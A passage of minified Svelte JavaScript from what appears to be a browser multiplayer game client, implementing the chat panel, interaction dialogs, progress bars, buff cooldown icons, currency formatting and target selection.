                    e.innerHTML = i
            },
            p(t, n) {
                64 & n[0] && i !== (i = t[33].text + "") && (e.innerHTML = i),
                    64 & n[0] && s !== (s = "text" + t[33].channel + " svelte-1vrlsr3") && B(e, "class", s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function pb(t, e) {
        let s, i, n, a, r, o, l, c, h, d, u = e[33].time + "", m = e[33].channel + "", p = e[33].sender && cb(e);
        function f(t, e) {
            return t[33].interpolate ? mb : ub
        }
        let g = f(e)
            , v = g(e);
        return {
            key: t,
            first: null,
            c() {
                s = T("article"),
                    i = T("div"),
                    n = T("span"),
                    a = P(u),
                    r = T("span"),
                    o = T("span"),
                    l = P(m),
                    c = I(),
                    p && p.c(),
                    v.c(),
                    B(n, "class", "time svelte-1vrlsr3"),
                    B(o, "class", "capitalize channel svelte-1vrlsr3"),
                    B(r, "class", h = "text" + e[33].channel + " content svelte-1vrlsr3"),
                    B(i, "class", "linewrap svelte-1vrlsr3"),
                    B(s, "class", "line svelte-1vrlsr3"),
                    this.first = s
            },
            m(t, e) {
                M(t, s, e),
                    E(s, i),
                    E(i, n),
                    E(n, a),
                    E(i, r),
                    E(r, o),
                    E(o, l),
                    E(r, c),
                    p && p.m(r, null),
                    v.m(i, null),
                    d = !0
            },
            p(t, e) {
                (!d || 64 & e[0]) && u !== (u = t[33].time + "") && F(a, u),
                    (!d || 64 & e[0]) && m !== (m = t[33].channel + "") && F(l, m),
                    t[33].sender ? p ? (p.p(t, e),
                        64 & e[0] && Et(p, 1)) : (p = cb(t),
                            p.c(),
                            Et(p, 1),
                            p.m(r, null)) : p && ($t(),
                                Mt(p, 1, 1, () => {
                                    p = null
                                }
                                ),
                                St()),
                    (!d || 64 & e[0] && h !== (h = "text" + t[33].channel + " content svelte-1vrlsr3")) && B(r, "class", h),
                    g === (g = f(t)) && v ? v.p(t, e) : (v.d(1),
                        v = g(t),
                        v && (v.c(),
                            v.m(i, null)))
            },
            i(t) {
                d || (Et(p),
                    d = !0)
            },
            o(t) {
                Mt(p),
                    d = !1
            },
            d(t) {
                t && _(s),
                    p && p.d(),
                    v.d()
            }
        }
    }
    function fb(t) {
        let e, s, i, n, a, r = t[30] + "";
        function o(...e) {
            return t[22](t[30], ...e)
        }
        return {
            c() {
                e = T("div"),
                    s = P("/"),
                    i = P(r),
                    B(e, "class", n = "choice textsystem text" + t[30] + " svelte-1vrlsr3")
            },
            m(t, n, r) {
                M(t, e, n),
                    E(e, s),
                    E(e, i),
                    r && a(),
                    a = A(e, "click", o)
            },
            p(e, s) {
                t = e
            },
            d(t) {
                t && _(e),
                    a()
            }
        }
    }
    function gb(t) {
        let e, s, i, n, a = t[27] + "";
        function r(...e) {
            return t[26](t[27], ...e)
        }
        return {
            c() {
                e = T("small"),
                    s = P(a),
                    B(e, "class", i = "btn border black text" + (t[5].indexOf(t[27]) < 0 ? t[27] : "grey") + " svelte-1vrlsr3")
            },
            m(t, i, a) {
                M(t, e, i),
                    E(e, s),
                    a && n(),
                    n = A(e, "click", r)
            },
            p(s, n) {
                t = s,
                    32 & n[0] && i !== (i = "btn border black text" + (t[5].indexOf(t[27]) < 0 ? t[27] : "grey") + " svelte-1vrlsr3") && B(e, "class", i)
            },
            d(t) {
                t && _(e),
                    n()
            }
        }
    }
    function vb(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p, f, g, v, y = [], b = new ab, w = t[6];
        const x = t => t[33].id;
        for (let e = 0; e < w.length; e += 1) {
            let s = lb(t, w, e)
                , i = x(s);
            b.set(i, y[e] = pb(i, s))
        }
        let k = Object.keys(op)
            , $ = [];
        for (let e = 0; e < k.length; e += 1)
            $[e] = fb(ob(t, k, e));
        let S = t[10]
            , I = [];
        for (let e = 0; e < S.length; e += 1)
            I[e] = gb(rb(t, S, e));
        return {
            c() {
                e = T("div"),
                    s = T("section");
                for (let t = 0; t < y.length; t += 1)
                    y[t].c();
                i = T("div"),
                    n = T("section"),
                    a = T("div"),
                    r = T("div");
                for (let t = 0; t < $.length; t += 1)
                    $[t].c();
                o = T("div"),
                    o.textContent = "/[playername]",
                    c = T("div"),
                    h = P(t[4]),
                    u = T("input"),
                    p = T("div");
                for (let t = 0; t < I.length; t += 1)
                    I[t].c();
                B(s, "id", "chat"),
                    B(s, "class", "panel frame scrollbar svelte-1vrlsr3"),
                    B(o, "class", "choice textwhisper"),
                    B(r, "class", "panel context commandlist textsystem svelte-1vrlsr3"),
                    U(r, "display", t[3] ? "block" : "none"),
                    B(c, "class", d = "command btn black text" + (lp[t[4]] ? lp[t[4]].chat ? t[4] : "system" : "whisper") + " svelte-1vrlsr3"),
                    B(u, "maxlength", "480"),
                    B(u, "type", "text"),
                    B(u, "class", "svelte-1vrlsr3"),
                    B(a, "id", "chatinput"),
                    B(a, "class", "inputcontainer panel-black border black svelte-1vrlsr3"),
                    B(n, "class", m = "chatsection " + (t[2] ? "" : "hidden") + " svelte-1vrlsr3"),
                    B(p, "class", f = "channelselect " + (t[2] ? "hidden" : "") + " svelte-1vrlsr3"),
                    B(i, "class", "lowercontainer svelte-1vrlsr3"),
                    B(e, "class", "l-corner-ll container uiscaled svelte-1vrlsr3")
            },
            m(d, m, f) {
                M(d, e, m),
                    E(e, s);
                for (let t = 0; t < y.length; t += 1)
                    y[t].m(s, null);
                t[21](s),
                    E(e, i),
                    E(i, n),
                    E(n, a),
                    E(a, r);
                for (let t = 0; t < $.length; t += 1)
                    $[t].m(r, null);
                E(r, o),
                    E(a, c),
                    E(c, h),
                    E(a, u),
                    t[24](u),
                    E(i, p);
                for (let t = 0; t < I.length; t += 1)
                    I[t].m(p, null);
                g = !0,
                    f && l(v),
                    v = [A(c, "click", t[23]), A(u, "input", t[25])]
            },
            p(t, e) {
                if (64 & e[0]) {
                    const i = t[6];
                    $t(),
                        y = At(y, e, x, 1, t, i, b, s, Dt, pb, null, lb),
                        St()
                }
                if (256 & e[0]) {
                    let s;
                    for (k = Object.keys(op),
                        s = 0; s < k.length; s += 1) {
                        const i = ob(t, k, s);
                        $[s] ? $[s].p(i, e) : ($[s] = fb(i),
                            $[s].c(),
                            $[s].m(r, o))
                    }
                    for (; s < $.length; s += 1)
                        $[s].d(1);
                    $.length = k.length
                }
                if ((!g || 8 & e[0]) && U(r, "display", t[3] ? "block" : "none"),
                    (!g || 16 & e[0]) && F(h, t[4]),
                    (!g || 16 & e[0] && d !== (d = "command btn black text" + (lp[t[4]] ? lp[t[4]].chat ? t[4] : "system" : "whisper") + " svelte-1vrlsr3")) && B(c, "class", d),
                    (!g || 4 & e[0] && m !== (m = "chatsection " + (t[2] ? "" : "hidden") + " svelte-1vrlsr3")) && B(n, "class", m),
                    1568 & e[0]) {
                    let s;
                    for (S = t[10],
                        s = 0; s < S.length; s += 1) {
                        const i = rb(t, S, s);
                        I[s] ? I[s].p(i, e) : (I[s] = gb(i),
                            I[s].c(),
                            I[s].m(p, null))
                    }
                    for (; s < I.length; s += 1)
                        I[s].d(1);
                    I.length = S.length
                }
                (!g || 4 & e[0] && f !== (f = "channelselect " + (t[2] ? "hidden" : "") + " svelte-1vrlsr3")) && B(p, "class", f)
            },
            i(t) {
                if (!g) {
                    for (let t = 0; t < w.length; t += 1)
                        Et(y[t]);
                    g = !0
                }
            },
            o(t) {
                for (let t = 0; t < y.length; t += 1)
                    Mt(y[t]);
                g = !1
            },
            d(s) {
                s && _(e);
                for (let t = 0; t < y.length; t += 1)
                    y[t].d();
                t[21](null),
                    C($, s),
                    t[24](null),
                    C(I, s),
                    l(v)
            }
        }
    }
    function yb(t, e, s) {
        let i, n, a, r;
        m(t, ie, t => s(14, i = t)),
            m(t, is, t => s(4, n = t)),
            m(t, Bs, t => s(5, a = t));
        let o, l = !0;
        Q(() => {
            l = r && (r.offsetHeight + r.scrollTop > r.scrollHeight - 20 || 0 == r.scrollTop)
        }
        ),
            tt(() => {
                !1 !== l && r.scrollTo(0, r.scrollHeight)
            }
            );
        let c, h = !1, d = [], u = 0, p = !1, f = "global";
        const g = new Map([["c", "clan"], ["p", "party"], ["g", "global"], ["f", "faction"]])
            , v = t => {
                const e = t.match(/^\/[a-zA-Z0-9]+ /g);
                if (e) {
                    const a = e[0].substring(1, e[0].length - 1);
                    if ("r" === a || "w" === a)
                        for (let t = i.length - 1; t > 0; --t) {
                            const e = i[t];
                            "whisper" == e.channel && "from" === e.sender.substring(0, 4) && (y(is, n = e.sender.slice(5)),
                                t = 0)
                        }
                    else
                        y(is, n = g.has(a) ? g.get(a) : a);
                    s(1, o.value = t.substring(e[0].length), o)
                }
            }
            , b = t => lp[t] && lp[t].chat
            , w = t => {
                if (13 === t.keyCode)
                    if (t.target == o) {
                        if ("" != t.target.value) {
                            ib(39, 100);
                            const e = t.target.value.match(/^\/[a-zA-Z0-9]+/g);
                            e && (y(is, n = e[0].substring(1)),
                                s(1, o.value = "", o)),
                                rp(n, o.value);
                            const i = `/${n} ` + o.value;
                            d[d.length - 1] != i && (u = d.push(i)),
                                s(1, o.value = "", o),
                                s(2, h = !1),
                                o.blur()
                        } else
                            b(n) || rp(n, o.value),
                                s(2, h = !1),
                                o.blur();
                        b(n) ? f = n : y(is, n = f)
                    } else
                        document.activeElement == document.body && (s(2, h = !0),
                            o.focus(),
                            dt().then(x));
                else
                    38 !== t.keyCode && 40 !== t.keyCode || !d.length ? 27 === t.keyCode && (s(2, h = !1),
                        o.blur()) : t.target == o && (u += 38 === t.keyCode ? -1 : 1,
                            u = nr(u, 0, d.length - 1),
                            v(d[u]),
                            t.preventDefault())
            }
            , x = t => {
                o && o.focus(),
                    ib(38, 100)
            }
            , k = t => {
                y(is, n = t),
                    s(3, p = !1),
                    o && o.focus()
            }
            ;
        J(() => {
            document.addEventListener("keydown", w)
        }
        ),
            et(() => {
                document.removeEventListener("keydown", w),
                    s(1, o = void 0)
            }
            );
        const $ = t => {
            const e = a.indexOf(t);
            Bs.update(s => (e >= 0 ? s.splice(e, 1) : s.push(t),
                s))
        }
            , S = ["global", "faction", "party", "clan", "pvp", "inv"];
        function E(t) {
            at[t ? "unshift" : "push"](() => {
                s(0, r = t)
            }
            )
        }
        const M = (t, e) => k(t)
            , _ = t => s(3, p = !p);
        function C(t) {
            at[t ? "unshift" : "push"](() => {
                s(1, o = t)
            }
            )
        }
        const T = t => v(t.target.value)
            , P = (t, e) => $(t);
        let I;
        return t.$$.update = () => {
            16416 & t.$$.dirty[0] && s(6, I = i.filter(t => a.indexOf(t.channel) < 0))
        }
            ,
            [r, o, h, p, n, a, I, v, k, $, S, l, u, f, i, d, c, g, b, w, x, E, M, _, C, T, P]
    }
    class bb extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, yb, vb, h, {}, [-1, -1])
        }
    }
    function wb(t) {
        let e, s;
        return {
            c() {
                e = T("img"),
                    e.src !== (s = "/assets/ui/icons/" + t[1] + ".svg?v=4002247") && B(e, "src", s),
                    B(e, "class", "titleicon svgicon svelte-1rw636")
            },
            m(t, s) {
                M(t, e, s)
            },
            p(t, i) {
                2 & i && e.src !== (s = "/assets/ui/icons/" + t[1] + ".svg?v=4002247") && B(e, "src", s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function xb(t) {
        let e, s, n;
        return {
            c() {
                e = T("img"),
                    e.src !== (s = "/assets/ui/icons/cross.svg?v=4002247") && B(e, "src", s),
                    B(e, "class", "btn black svgicon")
            },
            m(s, i, a) {
                M(s, e, i),
                    a && n(),
                    n = A(e, "click", t[7])
            },
            p: i,
            d(t) {
                t && _(e),
                    n()
            }
        }
    }
    function kb(t) {
        let e, s, i, n, a, r, o, l, c = t[1] && wb(t), h = t[2] && xb(t);
        const d = t[6].default
            , u = p(d, t, t[5], null);
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    c && c.c(),
                    i = T("div"),
                    n = T("div"),
                    a = P(t[0]),
                    h && h.c(),
                    r = T("div"),
                    u && u.c(),
                    B(n, "name", "title"),
                    B(i, "class", "textprimary title svelte-1rw636"),
                    B(s, "class", "titleframe svelte-1rw636"),
                    B(r, "class", o = "slot " + (t[3] ? "scrollbar" : "") + " svelte-1rw636"),
                    B(e, "class", "window panel-black svelte-1rw636")
            },
            m(t, o) {
                M(t, e, o),
                    E(e, s),
                    c && c.m(s, null),
                    E(s, i),
                    E(i, n),
                    E(n, a),
                    h && h.m(s, null),
                    E(e, r),
                    u && u.m(r, null),
                    l = !0
            },
            p(t, [e]) {
                t[1] ? c ? c.p(t, e) : (c = wb(t),
                    c.c(),
                    c.m(s, i)) : c && (c.d(1),
                        c = null),
                    (!l || 1 & e) && F(a, t[0]),
                    t[2] ? h ? h.p(t, e) : (h = xb(t),
                        h.c(),
                        h.m(s, null)) : h && (h.d(1),
                            h = null),
                    u && u.p && 32 & e && u.p(f(d, t, t[5], null), g(d, t[5], e, null)),
                    (!l || 8 & e && o !== (o = "slot " + (t[3] ? "scrollbar" : "") + " svelte-1rw636")) && B(r, "class", o)
            },
            i(t) {
                l || (Et(u, t),
                    l = !0)
            },
            o(t) {
                Mt(u, t),
                    l = !1
            },
            d(t) {
                t && _(e),
                    c && c.d(),
                    h && h.d(),
                    u && u.d(t)
            }
        }
    }
    function $b(t, e, s) {
        const i = st();
        let { title: n = "Title" } = e
            , { icon: a } = e
            , { close: r = !0 } = e
            , { scroll: o = !1 } = e
            , { $$slots: l = {}, $$scope: c } = e;
        const h = () => i("close");
        return t.$set = t => {
            "title" in t && s(0, n = t.title),
                "icon" in t && s(1, a = t.icon),
                "close" in t && s(2, r = t.close),
                "scroll" in t && s(3, o = t.scroll),
                "$$scope" in t && s(5, c = t.$$scope)
        }
            ,
            [n, a, r, o, i, c, l, h]
    }
    class Sb extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, $b, kb, h, {
                    title: 0,
                    icon: 1,
                    close: 2,
                    scroll: 3
                })
        }
    }
    const Eb = t => {
        const e = (t || 0).toString().split("");
        return {
            c: e.splice(-2).join(""),
            s: e.splice(-2).join(""),
            g: e.join("")
        }
    }
        , Mb = t => t > 1e3 ? (t / 1e3).toFixed(1) + "k" : t + ""
        , _b = t => t > 1e3 ? Math.round(t / 1e3) + "k" : t + ""
        , Cb = t => t < 999 ? t + "" : Cb(~~(t / 1e3)) + "," + ("00" + ~~(t % 1e3)).substr(-3, 3)
        , Tb = (t, e) => t.length > e ? t.slice(0, e - 2) + "..." : t
        , Pb = Fp({
            14: .1,
            13: .1,
            9: .1,
            8: .1,
            16: .1
        })
        , Ib = Fp({
            14: "%",
            13: "%",
            16: "%",
            18: "%"
        })
        , Db = (t, e) => (Pb.has(t) && (e = (e *= Pb.get(t)).toFixed(e >= .1 ? 1 : 2)),
            e + (Ib.get(t) || ""))
        , Ab = t => t.replace(/\$e(\d+)/g, (t, e) => Zb(e))
        , Bb = t => t.replace(/\$g(\d+)/g, (t, e) => zb(e, !1))
        , Rb = t => t.replace(/\$m(\d+)/g, (t, e) => Fb(e, !1))
        , zb = (t, e = !1) => {
            const { c: s, s: i, g: n } = Eb(t);
            let a = "<span/>";
            return "" != n && (a += `<span class=${e ? "textred" : "textgold"}>${n}</span> <img class=texticon src='/assets/ui/currency/gold.${Bo}?v=4002247'/>`),
                "" != i && (a += `<span class=${e ? "textred" : "textsilver"}>${i}</span> <img class=texticon src='/assets/ui/currency/silver.${Bo}?v=4002247'/>`),
                "" != s && (a += `<span class=${e ? "textred" : "textcopper"}>${s}</span> <img class=texticon src='/assets/ui/currency/copper.${Bo}?v=4002247'/>`),
                a + "</span>"
        }
        , Fb = (t, e = !1) => `<span class='${e ? "textred" : "textgold"}'><img class='svgicon' src='${Tp()}'> ${Cb(t)}</span>`
        , Zb = t => `<span class='bold textfame'><img class='svgicon' src='${Cp(t)}'> ${Cb(t)}</span>`
        , Ub = [t => t.replace(/\$c(\d)/g, (t, e) => `<img class=texticon src='${Ep(e)}'>`), t => t.replace(/\$l(\d+)/g, (t, e) => `<span class=textwhite>${e}</span>`), t => t.replace(/\$f(\d)(\w*)/g, (t, e, s) => `<span class=textf${e}>${s}</span>`), Bb, t => t.replace(/\$fm(\d+)/g, (t, e) => `<span class=textfame><img class=texticon src='/assets/ui/icons/crown.svg?v=4002247'> ${e}</span>`), t => t.replace(/\$gt/g, (t, e) => '<img class="svgicon" src="/assets/ui/icons/check.svg?v=4002247">'), t => t.replace(/\$sp(\d+)/g, (t, e) => "<img class=texticon src=/assets/ui/icons/gem.svg?v=4002247/>" + e), Rb, Ab]
        , Lb = t => Ub.reduce((t, e) => e(t), t);
    function Nb(t, e, s) {
        const i = t.slice();
        return i[4] = e[s],
            i[6] = s,
            i
    }
    function Ob(t) {
        let e, s;
        const i = new Sb({
            props: {
                title: "Interaction",
                $$slots: {
                    default: [qb]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return i.$on("close", t[3]),
        {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "class", "l-upperLeftModal container uiscaled svelte-uxs0uj")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, e) {
                const s = {};
                129 & e && (s.$$scope = {
                    dirty: e,
                    ctx: t
                }),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    function jb(t) {
        let e, s, i, n, a = Lb(t[4]) + "";
        function r(...e) {
            return t[2](t[6], ...e)
        }
        return {
            c() {
                e = T("div"),
                    s = T("span"),
                    B(e, "class", "choice"),
                    B(e, "value", i = t[6])
            },
            m(t, i, o) {
                M(t, e, i),
                    E(e, s),
                    s.innerHTML = a,
                    o && n(),
                    n = A(e, "click", r)
            },
            p(e, i) {
                t = e,
                    1 & i && a !== (a = Lb(t[4]) + "") && (s.innerHTML = a)
            },
            d(t) {
                t && _(e),
                    n()
            }
        }
    }
    function qb(t) {
        let e, s, i, n, a, r = t[0].title + "", o = t[0].text + "", l = t[0].choices, c = [];
        for (let e = 0; e < l.length; e += 1)
            c[e] = jb(Nb(t, l, e));
        return {
            c() {
                e = T("div"),
                    s = T("h3"),
                    i = P(r),
                    n = T("p"),
                    a = P(o);
                for (let t = 0; t < c.length; t += 1)
                    c[t].c();
                B(s, "class", "textprimary name svelte-uxs0uj"),
                    B(e, "class", "container svelte-uxs0uj")
            },
            m(t, r) {
                M(t, e, r),
                    E(e, s),
                    E(s, i),
                    E(e, n),
                    E(n, a);
                for (let t = 0; t < c.length; t += 1)
                    c[t].m(e, null)
            },
            p(t, s) {
                if (1 & s && r !== (r = t[0].title + "") && F(i, r),
                    1 & s && o !== (o = t[0].text + "") && F(a, o),
                    3 & s) {
                    let i;
                    for (l = t[0].choices,
                        i = 0; i < l.length; i += 1) {
                        const n = Nb(t, l, i);
                        c[i] ? c[i].p(n, s) : (c[i] = jb(n),
                            c[i].c(),
                            c[i].m(e, null))
                    }
                    for (; i < c.length; i += 1)
                        c[i].d(1);
                    c.length = l.length
                }
            },
            d(t) {
                t && _(e),
                    C(c, t)
            }
        }
    }
    function Xb(t) {
        let e, s, i = t[0] && Ob(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[0] ? i ? (i.p(t, s),
                    1 & s && Et(i, 1)) : (i = Ob(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function Hb(t, e, s) {
        let i;
        function n(t) {
            Bm(ro.clientPlayerInteract.packData({
                id: t
            })),
                y(Gt, i = void 0)
        }
        m(t, Gt, t => s(0, i = t));
        const a = (t, e) => n(t)
            , r = () => {
                y(Gt, i = void 0)
            }
            ;
        return [i, n, a, r]
    }
    class Kb extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, Hb, Xb, h, {})
        }
    }
    function Wb(t) {
        let e, s, i, n, a, r, o, l, c;
        const h = t[7].default
            , d = p(h, t, t[6], null);
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    i = T("span"),
                    n = P(t[0]),
                    a = T("span"),
                    r = P(t[1]),
                    d && d.c(),
                    B(i, "class", "left svelte-i7i7g5"),
                    B(a, "class", "right svelte-i7i7g5"),
                    B(s, "class", o = "progressBar " + t[3] + " svelte-i7i7g5"),
                    U(s, "width", t[2] + "%"),
                    U(s, "font-size", t[4]),
                    B(e, "class", l = "bar " + (t[5] ? "dark" : "") + " svelte-i7i7g5"),
                    U(e, "z-index", "hp" == t[3] ? "1" : "0")
            },
            m(t, o) {
                M(t, e, o),
                    E(e, s),
                    E(s, i),
                    E(i, n),
                    E(s, a),
                    E(a, r),
                    d && d.m(e, null),
                    c = !0
            },
            p(t, [i]) {
                (!c || 1 & i) && F(n, t[0]),
                    (!c || 2 & i) && F(r, t[1]),
                    (!c || 8 & i && o !== (o = "progressBar " + t[3] + " svelte-i7i7g5")) && B(s, "class", o),
                    (!c || 4 & i) && U(s, "width", t[2] + "%"),
                    (!c || 16 & i) && U(s, "font-size", t[4]),
                    d && d.p && 64 & i && d.p(f(h, t, t[6], null), g(h, t[6], i, null)),
                    (!c || 32 & i && l !== (l = "bar " + (t[5] ? "dark" : "") + " svelte-i7i7g5")) && B(e, "class", l),
                    (!c || 8 & i) && U(e, "z-index", "hp" == t[3] ? "1" : "0")
            },
            i(t) {
                c || (Et(d, t),
                    c = !0)
            },
            o(t) {
                Mt(d, t),
                    c = !1
            },
            d(t) {
                t && _(e),
                    d && d.d(t)
            }
        }
    }
    function Yb(t, e, s) {
        let { left: i } = e
            , { right: n } = e
            , { fract: a } = e
            , { barcol: r } = e
            , { size: o } = e
            , { darken: l } = e
            , { $$slots: c = {}, $$scope: h } = e;
        return t.$set = t => {
            "left" in t && s(0, i = t.left),
                "right" in t && s(1, n = t.right),
                "fract" in t && s(2, a = t.fract),
                "barcol" in t && s(3, r = t.barcol),
                "size" in t && s(4, o = t.size),
                "darken" in t && s(5, l = t.darken),
                "$$scope" in t && s(6, h = t.$$scope)
        }
            ,
            [i, n, a, r, o, l, h, c]
    }
    class Vb extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, Yb, Wb, d, {
                    left: 0,
                    right: 1,
                    fract: 2,
                    barcol: 3,
                    size: 4,
                    darken: 5
                })
        }
    }
    const Gb = new Map;
    let Qb = !1;
    const Jb = () => {
        fetch("/assets/ui/circlecooldowns/circlecooldowns.txt?v=4002247").then(async t => {
            const e = (await t.text()).split("\n");
            for (let t = 0; t < 3; ++t) {
                const s = [];
                for (let t = 0; t < 101; ++t) {
                    const t = new Image;
                    t.src = e.shift(),
                        s.push([t])
                }
                Gb.set([40, 31, 23][t], s)
            }
            Qb = !0
        }
        )
    }
        , tw = (t, e, s) => {
            Qb && e && t !== e.step && (void 0 !== e.cdimg && (Gb.get(s)[e.step].push(e.removeChild(e.cdimg)),
                e.cdimg = void 0),
                (e.step = t) > 0 && (1 === Gb.get(s)[e.step].length ? e.cdimg = Gb.get(s)[e.step][0].cloneNode() : e.cdimg = Gb.get(s)[e.step].pop(),
                    e.appendChild(e.cdimg)))
        }
        ;
    var ew = Object.freeze({
        __proto__: null,
        init: Jb,
        updateCd: tw
    });
    function sw(t) {
        let e, s, i = (t[4] > 99 ? Math.round(t[4] / 60) + "'" : Math.ceil(t[4])) + "";
        return {
            c() {
                e = T("div"),
                    s = P(i),
                    B(e, "class", "time absCentered slottext svelte-wo3pyh")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                16 & e && i !== (i = (t[4] > 99 ? Math.round(t[4] / 60) + "'" : Math.ceil(t[4])) + "") && F(s, i)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function iw(t) {
        let e, s;
        return {
            c() {
                e = T("div"),
                    s = P(t[0]),
                    B(e, "class", "stacks slottext svelte-wo3pyh")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                1 & e && F(s, t[0])
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function nw(t) {
        let e, s, n, a, r, o, l, c = t[3] > 30 && ji.cdTextBuffs && sw(t), h = t[0] > 1 && iw(t);
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    c && c.c(),
                    n = T("img"),
                    r = T("div"),
                    h && h.c(),
                    B(n, "class", "icon svelte-wo3pyh"),
                    n.src !== (a = t[1]) && B(n, "src", a),
                    U(n, "max-width", t[3] + "px"),
                    B(r, "class", "overlay svelte-wo3pyh"),
                    B(s, "class", o = "slot border " + (1 === t[2] ? "negative" : "positive") + " svelte-wo3pyh"),
                    B(e, "class", l = "container " + (t[4] < ji.buffCdFlashingDuration && t[4] % ji.buffCdFlashingInterval * 2 > ji.buffCdFlashingInterval ? "soon" : "") + " svelte-wo3pyh")
            },
            m(i, a) {
                M(i, e, a),
                    E(e, s),
                    c && c.m(s, null),
                    E(s, n),
                    E(s, r),
                    t[9](r),
                    h && h.m(s, null)
            },
            p(t, [i]) {
                t[3] > 30 && ji.cdTextBuffs ? c ? c.p(t, i) : (c = sw(t),
                    c.c(),
                    c.m(s, n)) : c && (c.d(1),
                        c = null),
                    2 & i && n.src !== (a = t[1]) && B(n, "src", a),
                    8 & i && U(n, "max-width", t[3] + "px"),
                    t[0] > 1 ? h ? h.p(t, i) : (h = iw(t),
                        h.c(),
                        h.m(s, null)) : h && (h.d(1),
                            h = null),
                    4 & i && o !== (o = "slot border " + (1 === t[2] ? "negative" : "positive") + " svelte-wo3pyh") && B(s, "class", o),
                    16 & i && l !== (l = "container " + (t[4] < ji.buffCdFlashingDuration && t[4] % ji.buffCdFlashingInterval * 2 > ji.buffCdFlashingInterval ? "soon" : "") + " svelte-wo3pyh") && B(e, "class", l)
            },
            i: i,
            o: i,
            d(s) {
                s && _(e),
                    c && c.d(),
                    t[9](null),
                    h && h.d()
            }
        }
    }
    function aw(t, e, s) {
        let i, { stacks: n } = e, { duration: a } = e, { time: r } = e, { icon: o } = e, { type: l } = e, { size: c } = e, h = 1, d = 0;
        function u(t) {
            at[t ? "unshift" : "push"](() => {
                s(5, i = t)
            }
            )
        }
        return t.$set = t => {
            "stacks" in t && s(0, n = t.stacks),
                "duration" in t && s(6, a = t.duration),
                "time" in t && s(7, r = t.time),
                "icon" in t && s(1, o = t.icon),
                "type" in t && s(2, l = t.type),
                "size" in t && s(3, c = t.size)
        }
            ,
            t.$$.update = () => {
                232 & t.$$.dirty && (s(4, d = a - r),
                    tw(Math.round(r / a * 100), i, c))
            }
            ,
            [n, o, l, c, d, i, a, r, h, u]
    }
    class rw extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, aw, nw, d, {
                    stacks: 0,
                    duration: 6,
                    time: 7,
                    icon: 1,
                    type: 2,
                    size: 3
                })
        }
    }
    const ow = [0, 0, 0]
        , lw = {
            enemy: [1, 0, 0],
            friendly: [0, 1, 0],
            dead: [.6, .6, .6]
        }
        , cw = t => {
            if (Ua && Ua.player) {
                const e = ro.clientPlayerChangeTarget.packData({
                    target: t
                });
                if (t !== Ua.player.target)
                    if (t > 0) {
                        const e = Ua.entity(t);
                        void 0 !== e && (3 === e.type ? e.canBePickedUpBy(Ua.player) && dl({
                            id: "ui/pickup",
                            pitch: -1
                        }) : (dl({
                            id: "ui/target",
                            pitch: -1
                        }),
                            2 === e.faction && ib(4, 100)))
                    } else
                        0 === t && dl({
                            id: "ui/detarget",
                            pitch: -1
                        });
                mw = Ua.player.target,
                    uw.reset(Ua.time),
                    Ua.player.setTarget(t),
                    Bm(e)
            }
        }
        ;
    let hw = 0
        , dw = !1;
    const uw = new fh(0, 1);
    let mw = 0;
    const pw = t => {
        mw !== t && (mw = t,
            uw.done(Ua.time) ? Ua.player.setTarget(t) : uw.reset(Ua.time, nr(uw.passed(Ua.time) + .5, .5, 2)))
    }
        ;
    let fw = 0;
    const gw = () => {
        $l.lmb.onPress(t => {
            fw = Ua.time
        }
        ),
            $l.lmb.onRelease(t => {
                hw > 0 && Pl < 20 && Ua.time - fw < .3 && cw(hw)
            }
            ),
            $l.nextTarget.onPress(t => {
                Sw = t.shiftKey ? 1 : 2
            }
            ),
            $l.untarget.onPress(t => {
                cw(0)
            }
            )
    }
        , vw = (t, e = !0) => {
            hw = t,
                dw = e && hw > 0,
                ce.set(dw ? "pointer" : "auto"),
                xe.set(hw)
        }
        , yw = t => {
            if (uw.done(Ua.time) && Ua.player.target !== mw && Ua.player.setTarget(mw),
                $l.shift.down)
                return;
            if (Al)
                return void (hw > 0 && (Pl >= 20 || Ua.time - fw > .3) && vw(0, !1));
            Vi(ow, wl[0], wl[1], .5),
                Ba.unproject(ow),
                tn(ow, ow, Ba.worldPosition),
                on(ow, ow);
            const e = hw;
            hw = 0;
            let s = 1 / 0
                , i = !1;
            Ua.entities.array.forEach(t => {
                if (!t.transform.visible)
                    return;
                const e = Yi(qa, t.transform.position);
                e[1] += .3 * t.size;
                const n = an(e, vr(Ba.worldPosition, ow, e));
                (void 0 === t.stats || t.stats.alive) && n < s && n < (t.size + .7) ** 2 && t.hudPos[2] < 1 && (s = n,
                    hw = t.id,
                    i = 3 !== t.type || t.canBePickedUpBy(Ua.player))
            }
            ),
                e == hw && i === dw || vw(hw, i)
        }
        ;
    let bw = void 0
        , ww = 0
        , xw = 0;
    const kw = [1, 1, 1, .3]
        , $w = t => {
            if (!Ua.player)
                return;
            const e = Ua.player.target
                , s = hw > 0 ? Ua.getEntityById(hw) : void 0;
